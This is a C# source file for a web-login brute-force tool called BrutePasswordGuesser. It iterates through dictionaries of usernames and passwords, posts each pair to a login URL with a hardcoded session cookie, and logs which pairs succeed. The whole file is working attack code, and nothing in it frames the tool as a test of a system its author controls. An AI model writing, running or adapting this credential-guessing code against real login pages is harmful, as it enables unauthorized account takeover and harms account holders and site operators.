using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;

namespace Webpage_Password_by_force
{
    
    class BrutePasswordGuesser
    {
        private const bool _NOT_PAUSED = false;
        public Dictionary _Dictionary;
        public webMethod _webMethod;


        private volatile Boolean _KeepWorking;
        public  Boolean isPause = false;

        public int totalProgress = 0;
        public int progress = 0, total = 0;
        public bool complete = false;
        public string pageSrc = "";


        private int _dealy = 200; // Microseconds

        public string _info;
        public string _successfulLogins;

        private int totalUsers = 0;
        private int totalPasswords = 0;
        private int currentPasswordNum = 0;
        private int currentUserNum = 0;
        private string currentUser = "";
        private string currentPassword = "";
         private Uri myUri = new Uri("https://www.webpage.com/login/?");
        //private Uri myUri = new Uri("http://localhost/headers.php");
        System.Net.CookieContainer myCookies;

        public BrutePasswordGuesser(Dictionary Dic)
        {

            // wr.CookieContainer = new CookieContainer();
            // wr.CookieContainer.Add(new Cookie("PHPSESSID", "u3ilo4qnvau5cfr5qsqet16o1b"));
            _Dictionary = Dic;
            _KeepWorking = true;
            isPause = _NOT_PAUSED;
            _webMethod = new webMethod();

             myCookies = new System.Net.CookieContainer();
            myCookies.Add(new Cookie("PHPSESSID", "u3ilo4qnvau5cfr5qsqet16o1b") { Domain = myUri.Host });

            progress = 0;

            totalPasswords = _Dictionary.allPasswords.Length;
            totalUsers = _Dictionary.allUsers.Length;
            total = totalPasswords * totalUsers;
        }


        public int getTotalProgress()
        {
            double num3 = (double)progress / (double)total;
            num3 *= 100;
            return (int)num3;
        }
        private void onComplete ()
        {
            addInfo("Completed");
            _KeepWorking = false;
            complete = true;
        }
        public void nextGuess()
        {
            while (_KeepWorking)
            {
                if (isPause == _NOT_PAUSED)
                {
                    /*
                    foreach (string userName in BruteGuesser._Dictionary.allUsers)
                    {
                        foreach (string password in BruteGuesser._Dictionary.allPasswords)
                        {
                            this.message(userName + ":" + password + " Failed");
                        }
                    }
                    */
                    Thread.Sleep(_dealy);
                    // addInfo("The thread is running");
                    progress += 1;


                    currentPassword = _Dictionary.allPasswords[currentPasswordNum];
                    currentUser = _Dictionary.allUsers[currentUserNum];



                    string postData = "username=" + Uri.EscapeDataString(currentUser) + "&pass=" + Uri.EscapeDataString(currentPassword) + "&action=login&email_link="+ Uri.EscapeDataString("https://www.webpage.com/login/?")+"&remember_me=1&format=json&mode=async";
                    
                    bool result = _webMethod.post(myUri, postData, myUri.OriginalString, myCookies, ref pageSrc);

                    pageSrc = "";

                    bool matched = false;

                    if (result) matched = true;
                    /*
                    Random r = new Random();
                    int rInt = r.Next(0, 10); //for ints
                    if (rInt > 8)
                    {
                        matched = true;
                       
                    }
                    /**/




                        /*
                         * 
                         * 
                         * */

                    if (matched)
                    {
                        _successfulLogins += "" + currentUser + ":" + currentPassword + "\n";
                    }


                    if (matched)
                    {
                        addInfo("" + currentUser + ":" + currentPassword + " Sucessful");
                    }
                    else
                    {
                        addInfo("" + currentUser + ":" + currentPassword + " Failed");
                    }
                    

                    currentPasswordNum++;
                    if (currentPasswordNum >= totalPasswords)
                    {
                        currentPasswordNum = 0;
                        currentUserNum++;
                        if (currentUserNum >= totalUsers)
                        {
                            currentUserNum = 0;
                            onComplete();
                        }
                    }






                }
                else
                {
                    Thread.Sleep(_dealy);
                   // addInfo("The thread is paused");
                }
               
            }
        }
        void addInfo(string newText)
        {
            

            _info+= newText + "\n";
        }
        public void stopGuessing()
        {
            _KeepWorking = false;
        }
    }
}
